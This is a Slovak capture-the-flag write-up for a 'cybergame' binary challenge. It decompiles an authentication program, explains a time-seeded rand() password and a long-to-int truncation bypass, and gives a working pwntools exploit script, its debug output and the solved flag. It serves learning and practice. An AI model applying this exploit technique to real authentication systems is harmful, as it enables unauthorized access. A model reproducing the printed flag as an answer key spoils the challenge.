# Zadanie

EN: Your first mission at ByteBusters Inc. requires bypassing their executive floor security terminal. According to your intel, this authentication system was rushed into production with minimal testing.

SK: Tvoja prvá misia v ByteBusters Inc. vyžaduje obísť bezpečnostný terminál ich výkonného poschodia. Podľa spravodajských informácií bol tento autentifikačný systém urýchlene uvedený do prevádzky s minimálnym testovaním.

`exp.cybergame.sk:7003`

**Súbory:**

- chall
- libc.so.6

## Riešenie

Keď sa pripojíme na zadaný port (napríklad cez netcat alebo pwntools), zobrazí sa toto:

```
Welcome to the authentication system!
Please enter your password:
```

Heslo nepoznáme. Ako prvý krok teda potrebujeme analyzovať samotnú binárku a pochopiť, čo program v skutočnosti robí.

Binárku som otvoril v Ghidra (môžeme použiť aj IDA, Binary Ninja alebo iný disassembler). Ghidra automaticky vytvorí C-pseudokód jednotlivých funkcií, ale mená premenných sú generické. Pre lepšie pochopenie odporúčam premenovať si ich podľa kontextu.

Pre ešte lepšie pochopenie môžeme použiť pluginy ako MCP (Claude desktop + Ghidra), ktoré dokážu navrhnúť vhodné názvy premenných a automaticky komentovať kód.

Po dekompilácii funkcie `main` vyzerá jej C-pseudokód nasledovne:

```c
undefined8 main(void)
{
  int temp_result;
  time_t current_time;
  size_t newline_position;
  long in_FS_OFFSET;
  int loop_counter;
  long access_level;
  char user_password [16];
  char random_password [15];
  undefined1 null_terminator;
  long stack_canary;

  stack_canary = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  current_time = time((time_t *)0x0);
  srand((uint)current_time);
  puts("Welcome to the authentication system!");
  printf("Please enter your password: ");
  fgets(user_password,0x10,stdin);
  newline_position = strcspn(user_password,"\n");
  user_password[newline_position] = '\0';
  for (loop_counter = 0; loop_counter < 0x10; loop_counter = loop_counter + 1) {
    temp_result = rand();
    random_password[loop_counter] = (char)temp_result;
  }
  null_terminator = 0;
  temp_result = strcmp(user_password,random_password);
  if (temp_result != 0) {
    puts("Invalid password!");
                        /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("Please enter your access level (0-10): ");
  temp_result = __isoc99_scanf(&DAT_001020d0,&access_level);
  if (temp_result != 1) {
                        /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (10 < access_level) {
    puts("Access level is too high!");
                        /* WARNING: Subroutine does not return */
    exit(1);
  }
  if ((int)access_level == 0x1337) {
    puts("Access granted!");
    access_override();
  }
  printf("Welcome to the floor no.%ld!\n",access_level);
  if (stack_canary != *(long *)(in_FS_OFFSET + 0x28)) {
                        /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

### Čo z toho vyplýva?

#### 1. **Heslo**

* Hneď po spustení sa zistí aktuálny čas cez `time(NULL)`.
* Tento čas sa použije na inicializáciu náhodného generátora `srand(time(NULL));`.
* V cykle 16-krát zavolá `rand()`, pričom výsledok uloží ako bajt do `random_password`. (Pozn: pole má 15 bajtov, ale cyklus ide do 16. — to je síce buffer overflow, ale v tomto prípade pre úlohu nie je podstatné.)
* Naše heslo porovná s týmto náhodne vygenerovaným heslom: `strcmp(user_password, random_password)`.
* Heslo teda nie je fixné, ale je deterministicky generované podľa času na serveri.

#### 2. **Úroveň prístupu (Access Level)**

* Po úspešnom zadaní hesla sa server opýta na číslo prístupu (`0-10`).
* Ak zadáme vyššie ako 10, program sa ukončí s hláškou `Access level is too high!`.
* Ak (int)access\_level == 0x1337 (4919 decimálne), volá funkciu `access_override()` — tá vypíše valjku.

## 3. Ako získame správne heslo?

### Problém:

* Heslo je generované podľa času servera v momente spustenia procesu (každé pripojenie = nový proces = nový seed).
* Nemáme istotu, že čas na serveri je úplne rovnaký ako na našom PC, no rozdiel bude snáď malý (dúfam, že 1-2 sekundy).

### Riešenie:

* Napíšeme si skript, ktorý vygeneruje heslo rovnakým spôsobom ako server — teda použijeme rovnakú implementáciu C PRNG (pseudo random number generator).
* Na vygenerovanie hesla môžeme použiť Python a knižnicu `ctypes` na prístup k `libc.so.6` — to je tá istá knižnica, ktorú používa server, takže výstupy budú rovnaké.

## 4. Ako získame admin prístup?

V kóde je ochrana, ktorá nám zamedzí zadať priamo vyššie číslo ako 10:

```c
if (10 < access_level) {
  puts("Access level is too high!");
  exit(1);
}
```

Ale neskôr je kontrola, ktorá pretypuje long na int (4 bajtové číslo):

```c
if ((int)access_level == 0x1337) {
  access_override();
}
```

Takže premenná je síce typu `long`, ale kontroluje sa iba spodných 32 bitov (`int`).

Ak zadáme veľké záporné číslo (napr. `-4294962377`), tak jeho 32-bitová reprezentácia je práve `0x1337`.

Výpočet:

* `0xFFFFFFFF00001337` je -4294962377 ako signed long.
* (int)-4294962377 == 0x1337
* Ale zároveň toto číslo nie je vyššie ako 10, takže ochrana sa neaplikuje.

## 5. Exploit

Tu je kompletný Python exploit, ktorý všetko zautomatizuje:

* Pripojí sa na server
* Vygeneruje heslo podľa aktuálneho času -1s (ak neprejde, skúsim viackrát spustiť, keď ani tak, tak zmenim 1 na 2, akeď ani to, upravím skript...)
* Pošle správne heslo
* Pošle správnu hodnotu access levelu na obídenie ochrany

```python
import time
from pwn import *
import ctypes

context.log_level = 'debug'

# generovanie 15-bajtového hesla pomocou libc.so.6 
libc = ctypes.CDLL("libc.so.6")
srand = libc.srand
srand.argtypes = [ctypes.c_uint]
rand = libc.rand
rand.restype = ctypes.c_int

def get_password(seed):
    srand(seed)
    return bytes(rand() % 256 for _ in range(15))

# moj cas minus 1 sekunda
seed = int(time.time())-1 # 1-2 sekundy rozdiel oproti serveru, dal som 1
HOST, PORT = "exp.cybergame.sk", 7003

pwnio = remote(HOST, PORT, timeout=5)
pwnio.recvuntil(b"Please enter your password:")

pwnio.sendline(get_password(seed))          # 15 bajtov + \n

# over, či password prešiel
out = pwnio.recvline(timeout=1)
print(out.decode(errors='ignore'))

if b"Invalid password" not in out:
    pwnio.recvuntil(b"Please enter your access level")
    pwnio.sendline(b"-4294962377")  # 0xFFFFFFFF00001337
    print(pwnio.recvall(timeout=2).decode(errors='ignore'))

pwnio.close()
```

## 6. Výstup zo skriptu

Ak všetko prebehlo správne (u mňa na 4.té pustenie skriptu), dostaneme:

```
[+] Opening connection to exp.cybergame.sk on port 7003: Done
[DEBUG] Received 0x42 bytes:
    b'Welcome to the authentication system!\n'
    b'Please enter your password: '
[DEBUG] Sent 0x10 bytes:
    00000000  fa cb b8 00  61 4c 77 87  40 27 6b 57  64 7e 54 0a  │····│aLw·│@'kW│d~T·│
    00000010
[DEBUG] Received 0x27 bytes:
    b'Please enter your access level (0-10): '

[DEBUG] Sent 0xc bytes:
    b'-4294962377\n'
[+] Receiving all data: Done (116B)
[DEBUG] Received 0x42 bytes:
    b'Access granted!\n'
    b'Welcome to the the admin floor!\n'
    b'Here is the flag:\n'
[DEBUG] Received 0x29 bytes:
    b'SK-CERT{y0u_5h0uld_n07_h4v3_7h15_4cc355}\n'
[*] Closed connection to exp.cybergame.sk port 7003
 (0-10): Access granted!
Welcome to the the admin floor!
Here is the flag:
SK-CERT{y0u_5h0uld_n07_h4v3_7h15_4cc355}
```

Disclaimer: Ako aj pri niektorých iných mojich cybergame write-upoch, som sa rozhodol môj pôvodný príliš zdlhavý a únavný writeup alebo ak som si nebol istý, či som niečo nezabudol, nechať ho preštylizovať pomocou ChatGPT, aby to nejako vyzeralo. Snáď to teda vyzerá pekne. A ak si niekto myslí, že ho kompletne napísal za mňa, tak nie, nenapísal ho za mňa, sľubujem, mám aj pôvodnú verziu :D

## Vlajka

```
SK-CERT{y0u_5h0uld_n07_h4v3_7h15_4cc355}
```
